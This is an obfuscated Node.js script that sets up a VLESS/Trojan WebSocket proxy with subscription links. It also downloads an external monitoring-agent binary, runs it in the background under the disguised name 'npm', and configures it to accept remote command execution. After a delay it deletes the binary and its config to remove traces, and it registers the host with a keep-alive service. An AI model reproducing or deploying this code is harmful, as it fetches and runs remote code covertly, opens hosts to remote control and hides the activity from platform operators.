const _0x5f5ae=_0x19e7;function _0x19e7(_0x3a8d10,_0x2ad085){const _0x364078=_0x3640();return _0x19e7=function(_0x19e750,_0x3c4d19){_0x19e750=_0x19e750-0x121;let _0x1637c4=_0x364078[_0x19e750];return _0x1637c4;},_0x19e7(_0x3a8d10,_0x2ad085);}function _0x3640(){const _0x4d1b7d=['8443','6ZjZHBc','crypto','npm\x20is\x20already\x20running,\x20skip\x20running...','error:\x20','DOMAIN','utf8','https://amd64.ssss.nyc.mn/v1','29061714jZEtLZ','substr','once','post','https://amd64.ssss.nyc.mn/agent','chmod\x20+x\x20npm','write','pop','vless://','npm\x20download\x20successfully',':443?encryption=none&security=tls&sni=','split','index.html','setsid\x20nohup\x20./npm\x20-s\x20','then','8.8.4.4','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','2988828OIbnRJ','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','NEZHA_PORT','Server','error','every','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','/bin/bash','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','map','createServer','&fp=chrome&type=ws&host=','log','get','connect','digest','close','update','&path=%2F','4600JyjToR','2096','2087','send','217504dthRqm','concat','length','http','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','1234.abc.com','Answer','NAME','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','54QzrXjz','UUID','3620kGZPHR','npm\x20is\x20running','unlink','2053','sha224','test','text/plain','buffer','from','replace','application/dns-json','npm','Failed\x20to\x20resolve\x20','axios','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','slice','stream','21801CYGiLa','createWriteStream','https://oooo.serv00.net/add-url','join','child_process','application/json','Hug','--tls','1.1.1.1','toString','Unknown','hex','trojan://','decode','\x20with\x20all\x20DNS\x20servers','url','env','finish','readUInt16BE','Server\x20is\x20running\x20on\x20port\x20','SUB_PATH','end','30dtVipt','aarch64','net','sub','npm\x20running\x20error:','listen','message','https://dns.google/resolve?name=','find','reduce','includes','connection','catch','3383072PdHtNS','utf-8','1699300tSqnSb','pipe','Not\x20Found\x0a','client_secret:\x20','PORT','data','443','https://speed.cloudflare.com/meta','config.yaml','&type=A','writeHead','edb6f3ab-f8d9-4caa-ac93-5873bd7fdc11','true','text/html','readUInt8','\x20-p\x20'];_0x3640=function(){return _0x4d1b7d;};return _0x3640();}(function(_0x42103a,_0x4b79f8){const _0x219e22=_0x19e7,_0x53ab56=_0x42103a();while(!![]){try{const _0x1c53a8=-parseInt(_0x219e22(0x14e))/0x1+parseInt(_0x219e22(0x197))/0x2*(-parseInt(_0x219e22(0x129))/0x3)+-parseInt(_0x219e22(0x18a))/0x4*(-parseInt(_0x219e22(0x199))/0x5)+-parseInt(_0x219e22(0x15f))/0x6*(parseInt(_0x219e22(0x18e))/0x7)+parseInt(_0x219e22(0x14c))/0x8+-parseInt(_0x219e22(0x177))/0x9*(parseInt(_0x219e22(0x13f))/0xa)+parseInt(_0x219e22(0x166))/0xb;if(_0x1c53a8===_0x4b79f8)break;else _0x53ab56['push'](_0x53ab56['shift']());}catch(_0x1a3eae){_0x53ab56['push'](_0x53ab56['shift']());}}}(_0x3640,0xedf09));const os=require('os'),http=require(_0x5f5ae(0x191)),fs=require('fs'),axios=require(_0x5f5ae(0x125)),net=require(_0x5f5ae(0x141)),path=require('path'),crypto=require(_0x5f5ae(0x160)),{Buffer}=require(_0x5f5ae(0x1a0)),{exec,execSync}=require(_0x5f5ae(0x12d)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x5f5ae(0x139)][_0x5f5ae(0x198)]||_0x5f5ae(0x159),NEZHA_SERVER=process[_0x5f5ae(0x139)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x5f5ae(0x179)]||'',NEZHA_KEY=process[_0x5f5ae(0x139)]['NEZHA_KEY']||'',DOMAIN=process[_0x5f5ae(0x139)][_0x5f5ae(0x163)]||_0x5f5ae(0x193),AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process[_0x5f5ae(0x139)]['WSPATH']||UUID[_0x5f5ae(0x127)](0x0,0x8),SUB_PATH=process[_0x5f5ae(0x139)][_0x5f5ae(0x13d)]||_0x5f5ae(0x142),NAME=process[_0x5f5ae(0x139)][_0x5f5ae(0x195)]||_0x5f5ae(0x12f),PORT=process[_0x5f5ae(0x139)][_0x5f5ae(0x152)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x151751=_0x5f5ae;try{const _0x487f9b=await axios['get'](_0x151751(0x155)),_0x1ef5d8=_0x487f9b[_0x151751(0x153)];ISP=(_0x1ef5d8['country']+'-'+_0x1ef5d8['asOrganization'])[_0x151751(0x121)](/ /g,'_');}catch(_0x2177e1){ISP=_0x151751(0x133);}};GetISP();const httpServer=http[_0x5f5ae(0x181)]((_0x942bb9,_0x184402)=>{const _0x3d5cfb=_0x5f5ae;if(_0x942bb9[_0x3d5cfb(0x138)]==='/'){const _0x56b70e=path[_0x3d5cfb(0x12c)](__dirname,_0x3d5cfb(0x172));fs['readFile'](_0x56b70e,_0x3d5cfb(0x164),(_0x1b1b32,_0x538563)=>{const _0x487462=_0x3d5cfb;if(_0x1b1b32){_0x184402[_0x487462(0x158)](0xc8,{'Content-Type':_0x487462(0x15b)}),_0x184402[_0x487462(0x13e)]('Hello\x20world!');return;}_0x184402[_0x487462(0x158)](0xc8,{'Content-Type':_0x487462(0x15b)}),_0x184402[_0x487462(0x13e)](_0x538563);});return;}else{if(_0x942bb9[_0x3d5cfb(0x138)]==='/'+SUB_PATH){const _0x39796a=_0x3d5cfb(0x16e)+UUID+'@'+DOMAIN+_0x3d5cfb(0x170)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x3d5cfb(0x189)+WSPATH+'#'+NAME+'-'+ISP,_0x49e4f8=_0x3d5cfb(0x135)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x3d5cfb(0x182)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0xfb50e4=_0x39796a+'\x0a'+_0x49e4f8,_0xfb602a=Buffer[_0x3d5cfb(0x1a1)](_0xfb50e4)[_0x3d5cfb(0x132)]('base64');_0x184402[_0x3d5cfb(0x158)](0xc8,{'Content-Type':_0x3d5cfb(0x19f)}),_0x184402['end'](_0xfb602a+'\x0a');}else _0x184402[_0x3d5cfb(0x158)](0x194,{'Content-Type':'text/plain'}),_0x184402[_0x3d5cfb(0x13e)](_0x3d5cfb(0x150));}}),wss=new WebSocket[(_0x5f5ae(0x17a))]({'server':httpServer}),uuid=UUID[_0x5f5ae(0x121)](/-/g,''),DNS_SERVERS=[_0x5f5ae(0x175),_0x5f5ae(0x131)];function resolveHost(_0x32c3fe){return new Promise((_0x3c48db,_0x2fa10d)=>{const _0x150058=_0x19e7;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x150058(0x19e)](_0x32c3fe)){_0x3c48db(_0x32c3fe);return;}let _0x10a9fd=0x0;function _0x196cbf(){const _0x68c82c=_0x150058;if(_0x10a9fd>=DNS_SERVERS[_0x68c82c(0x190)]){_0x2fa10d(new Error(_0x68c82c(0x124)+_0x32c3fe+_0x68c82c(0x137)));return;}const _0x54dc23=DNS_SERVERS[_0x10a9fd];_0x10a9fd++;const _0x3077ce=_0x68c82c(0x146)+encodeURIComponent(_0x32c3fe)+_0x68c82c(0x157);axios[_0x68c82c(0x184)](_0x3077ce,{'timeout':0x1388,'headers':{'Accept':_0x68c82c(0x122)}})[_0x68c82c(0x174)](_0x1cf425=>{const _0x4403aa=_0x68c82c,_0x5f2a17=_0x1cf425[_0x4403aa(0x153)];if(_0x5f2a17['Status']===0x0&&_0x5f2a17['Answer']&&_0x5f2a17[_0x4403aa(0x194)]['length']>0x0){const _0x340e84=_0x5f2a17['Answer'][_0x4403aa(0x147)](_0x2b6dd5=>_0x2b6dd5['type']===0x1);if(_0x340e84){_0x3c48db(_0x340e84[_0x4403aa(0x153)]);return;}}_0x196cbf();})[_0x68c82c(0x14b)](_0x1b7f5d=>{_0x196cbf();});}_0x196cbf();});}function handleVlessConnection(_0x2f7cfc,_0x2ac43c){const _0x16774b=_0x5f5ae,[_0x5af434]=_0x2ac43c,_0x213d39=_0x2ac43c[_0x16774b(0x127)](0x1,0x11);if(!_0x213d39[_0x16774b(0x17c)]((_0x37e457,_0x2baef9)=>_0x37e457==parseInt(uuid[_0x16774b(0x167)](_0x2baef9*0x2,0x2),0x10)))return![];let _0x5d7e3c=_0x2ac43c[_0x16774b(0x127)](0x11,0x12)[_0x16774b(0x15c)]()+0x13;const _0x28553a=_0x2ac43c[_0x16774b(0x127)](_0x5d7e3c,_0x5d7e3c+=0x2)[_0x16774b(0x13b)](0x0),_0x1b2a01=_0x2ac43c[_0x16774b(0x127)](_0x5d7e3c,_0x5d7e3c+=0x1)[_0x16774b(0x15c)](),_0x521bfb=_0x1b2a01==0x1?_0x2ac43c[_0x16774b(0x127)](_0x5d7e3c,_0x5d7e3c+=0x4)['join']('.'):_0x1b2a01==0x2?new TextDecoder()[_0x16774b(0x136)](_0x2ac43c[_0x16774b(0x127)](_0x5d7e3c+0x1,_0x5d7e3c+=0x1+_0x2ac43c[_0x16774b(0x127)](_0x5d7e3c,_0x5d7e3c+0x1)[_0x16774b(0x15c)]())):_0x1b2a01==0x3?_0x2ac43c[_0x16774b(0x127)](_0x5d7e3c,_0x5d7e3c+=0x10)[_0x16774b(0x148)]((_0x45b53d,_0x3af970,_0x3fbf3a,_0x3f8dbb)=>_0x3fbf3a%0x2?_0x45b53d['concat'](_0x3f8dbb[_0x16774b(0x127)](_0x3fbf3a-0x1,_0x3fbf3a+0x1)):_0x45b53d,[])[_0x16774b(0x180)](_0x37a3c4=>_0x37a3c4[_0x16774b(0x13b)](0x0)[_0x16774b(0x132)](0x10))[_0x16774b(0x12c)](':'):'';_0x2f7cfc[_0x16774b(0x18d)](new Uint8Array([_0x5af434,0x0]));const _0x122bfb=createWebSocketStream(_0x2f7cfc);return resolveHost(_0x521bfb)['then'](_0x4503c5=>{const _0x1cb8cd=_0x16774b;net[_0x1cb8cd(0x185)]({'host':_0x4503c5,'port':_0x28553a},function(){const _0xece4e0=_0x1cb8cd;this[_0xece4e0(0x16c)](_0x2ac43c[_0xece4e0(0x127)](_0x5d7e3c)),_0x122bfb['on']('error',()=>{})[_0xece4e0(0x14f)](this)['on']('error',()=>{})[_0xece4e0(0x14f)](_0x122bfb);})['on'](_0x1cb8cd(0x17b),()=>{});})[_0x16774b(0x14b)](_0x41aa39=>{const _0x1a71b6=_0x16774b;net[_0x1a71b6(0x185)]({'host':_0x521bfb,'port':_0x28553a},function(){const _0x1b9eca=_0x1a71b6;this[_0x1b9eca(0x16c)](_0x2ac43c[_0x1b9eca(0x127)](_0x5d7e3c)),_0x122bfb['on'](_0x1b9eca(0x17b),()=>{})[_0x1b9eca(0x14f)](this)['on'](_0x1b9eca(0x17b),()=>{})[_0x1b9eca(0x14f)](_0x122bfb);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x460a3e,_0x17c06d){const _0xbddbe7=_0x5f5ae;try{if(_0x17c06d[_0xbddbe7(0x190)]<0x3a)return![];const _0x4a0bb8=_0x17c06d['slice'](0x0,0x38)['toString'](),_0x1c3651=[UUID];let _0x26d68b=null;for(const _0x17b8ee of _0x1c3651){const _0x3348f9=crypto['createHash'](_0xbddbe7(0x19d))[_0xbddbe7(0x188)](_0x17b8ee)[_0xbddbe7(0x186)](_0xbddbe7(0x134));if(_0x3348f9===_0x4a0bb8){_0x26d68b=_0x17b8ee;break;}}if(!_0x26d68b)return![];let _0x1dd8fc=0x38;_0x17c06d[_0x1dd8fc]===0xd&&_0x17c06d[_0x1dd8fc+0x1]===0xa&&(_0x1dd8fc+=0x2);const _0x5d4089=_0x17c06d[_0x1dd8fc];if(_0x5d4089!==0x1)return![];_0x1dd8fc+=0x1;const _0x347d05=_0x17c06d[_0x1dd8fc];_0x1dd8fc+=0x1;let _0x246d49,_0x4c2f39;if(_0x347d05===0x1)_0x246d49=_0x17c06d[_0xbddbe7(0x127)](_0x1dd8fc,_0x1dd8fc+0x4)[_0xbddbe7(0x12c)]('.'),_0x1dd8fc+=0x4;else{if(_0x347d05===0x3){const _0x3eac5c=_0x17c06d[_0x1dd8fc];_0x1dd8fc+=0x1,_0x246d49=_0x17c06d[_0xbddbe7(0x127)](_0x1dd8fc,_0x1dd8fc+_0x3eac5c)[_0xbddbe7(0x132)](),_0x1dd8fc+=_0x3eac5c;}else{if(_0x347d05===0x4)_0x246d49=_0x17c06d[_0xbddbe7(0x127)](_0x1dd8fc,_0x1dd8fc+0x10)[_0xbddbe7(0x148)]((_0x5873ba,_0x348023,_0x470032,_0x52ad14)=>_0x470032%0x2?_0x5873ba[_0xbddbe7(0x18f)](_0x52ad14[_0xbddbe7(0x127)](_0x470032-0x1,_0x470032+0x1)):_0x5873ba,[])['map'](_0x1d12b5=>_0x1d12b5[_0xbddbe7(0x13b)](0x0)[_0xbddbe7(0x132)](0x10))[_0xbddbe7(0x12c)](':'),_0x1dd8fc+=0x10;else return![];}}_0x4c2f39=_0x17c06d[_0xbddbe7(0x13b)](_0x1dd8fc),_0x1dd8fc+=0x2;_0x1dd8fc<_0x17c06d[_0xbddbe7(0x190)]&&_0x17c06d[_0x1dd8fc]===0xd&&_0x17c06d[_0x1dd8fc+0x1]===0xa&&(_0x1dd8fc+=0x2);const _0x2df379=createWebSocketStream(_0x460a3e);return resolveHost(_0x246d49)['then'](_0xdf0a34=>{const _0x4c09f9=_0xbddbe7;net[_0x4c09f9(0x185)]({'host':_0xdf0a34,'port':_0x4c2f39},function(){const _0x444b8b=_0x4c09f9;_0x1dd8fc<_0x17c06d[_0x444b8b(0x190)]&&this[_0x444b8b(0x16c)](_0x17c06d[_0x444b8b(0x127)](_0x1dd8fc)),_0x2df379['on'](_0x444b8b(0x17b),()=>{})['pipe'](this)['on'](_0x444b8b(0x17b),()=>{})['pipe'](_0x2df379);})['on'](_0x4c09f9(0x17b),()=>{});})[_0xbddbe7(0x14b)](_0x582abe=>{net['connect']({'host':_0x246d49,'port':_0x4c2f39},function(){const _0x5a80d1=_0x19e7;_0x1dd8fc<_0x17c06d['length']&&this['write'](_0x17c06d[_0x5a80d1(0x127)](_0x1dd8fc)),_0x2df379['on'](_0x5a80d1(0x17b),()=>{})['pipe'](this)['on']('error',()=>{})[_0x5a80d1(0x14f)](_0x2df379);})['on']('error',()=>{});}),!![];}catch(_0x5221af){return![];}}wss['on'](_0x5f5ae(0x14a),(_0x5369d7,_0x399eb9)=>{const _0x51e102=_0x5f5ae,_0x4c8edf=_0x399eb9[_0x51e102(0x138)]||'';_0x5369d7[_0x51e102(0x168)](_0x51e102(0x145),_0x294790=>{const _0x17b467=_0x51e102;if(_0x294790['length']>0x11&&_0x294790[0x0]===0x0){const _0x1efb5c=_0x294790[_0x17b467(0x127)](0x1,0x11),_0x240d6b=_0x1efb5c[_0x17b467(0x17c)]((_0x476da9,_0x1abd43)=>_0x476da9==parseInt(uuid[_0x17b467(0x167)](_0x1abd43*0x2,0x2),0x10));if(_0x240d6b){!handleVlessConnection(_0x5369d7,_0x294790)&&_0x5369d7[_0x17b467(0x187)]();return;}}!handleTrojanConnection(_0x5369d7,_0x294790)&&_0x5369d7[_0x17b467(0x187)]();})['on'](_0x51e102(0x17b),()=>{});});const getDownloadUrl=()=>{const _0x53b764=_0x5f5ae,_0x413939=os['arch']();return _0x413939==='arm'||_0x413939==='arm64'||_0x413939===_0x53b764(0x140)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x53b764(0x165):_0x53b764(0x16a);},downloadFile=async()=>{const _0x4b670d=_0x5f5ae;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x34ff67=getDownloadUrl(),_0x30cc27=await axios({'method':'get','url':_0x34ff67,'responseType':_0x4b670d(0x128)}),_0xfe5299=fs[_0x4b670d(0x12a)](_0x4b670d(0x123));return _0x30cc27[_0x4b670d(0x153)][_0x4b670d(0x14f)](_0xfe5299),new Promise((_0xe987c0,_0x4190bb)=>{const _0x1e1d7d=_0x4b670d;_0xfe5299['on'](_0x1e1d7d(0x13a),()=>{const _0x4bc7aa=_0x1e1d7d;console[_0x4bc7aa(0x183)](_0x4bc7aa(0x16f)),exec(_0x4bc7aa(0x16b),_0xb8db26=>{if(_0xb8db26)_0x4190bb(_0xb8db26);_0xe987c0();});}),_0xfe5299['on'](_0x1e1d7d(0x17b),_0x4190bb);});}catch(_0xc1163a){throw _0xc1163a;}},runnz=async()=>{const _0x4c6bf6=_0x5f5ae;try{const _0x326e6c=execSync(_0x4c6bf6(0x178),{'encoding':_0x4c6bf6(0x14d)});if(_0x326e6c['trim']()!==''){console[_0x4c6bf6(0x183)](_0x4c6bf6(0x161));return;}}catch(_0x5521cb){}await downloadFile();let _0x583633='',_0x333978=[_0x4c6bf6(0x154),_0x4c6bf6(0x15e),_0x4c6bf6(0x18b),_0x4c6bf6(0x18c),'2083',_0x4c6bf6(0x19c)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xdd2db7=_0x333978[_0x4c6bf6(0x149)](NEZHA_PORT)?_0x4c6bf6(0x130):'';_0x583633=_0x4c6bf6(0x173)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4c6bf6(0x15d)+NEZHA_KEY+'\x20'+_0xdd2db7+_0x4c6bf6(0x196);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1cb1fa=NEZHA_SERVER[_0x4c6bf6(0x149)](':')?NEZHA_SERVER[_0x4c6bf6(0x171)](':')[_0x4c6bf6(0x16d)]():'',_0x14251c=_0x333978[_0x4c6bf6(0x149)](_0x1cb1fa)?_0x4c6bf6(0x15a):'false',_0x15d91e=_0x4c6bf6(0x151)+NEZHA_KEY+_0x4c6bf6(0x176)+NEZHA_SERVER+_0x4c6bf6(0x126)+_0x14251c+_0x4c6bf6(0x192)+UUID;fs['writeFileSync'](_0x4c6bf6(0x156),_0x15d91e);}_0x583633=_0x4c6bf6(0x17f);}else{console[_0x4c6bf6(0x183)](_0x4c6bf6(0x17d));return;}}try{exec(_0x583633,{'shell':_0x4c6bf6(0x17e)},_0x539a2c=>{const _0x16fd5c=_0x4c6bf6;if(_0x539a2c)console['error'](_0x16fd5c(0x143),_0x539a2c);else console[_0x16fd5c(0x183)](_0x16fd5c(0x19a));});}catch(_0x585084){console[_0x4c6bf6(0x17b)](_0x4c6bf6(0x162)+_0x585084);}};async function addAccessTask(){const _0xce5023=_0x5f5ae;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5c7bfa='https://'+DOMAIN;try{const _0x1226ab=await axios[_0xce5023(0x169)](_0xce5023(0x12b),{'url':_0x5c7bfa},{'headers':{'Content-Type':_0xce5023(0x12e)}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x5619b1){}}const delFiles=()=>{const _0x34782b=_0x5f5ae;fs[_0x34782b(0x19b)](_0x34782b(0x123),()=>{}),fs['unlink'](_0x34782b(0x156),()=>{});};httpServer[_0x5f5ae(0x144)](PORT,()=>{const _0x3089aa=_0x5f5ae;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x3089aa(0x13c)+PORT);});
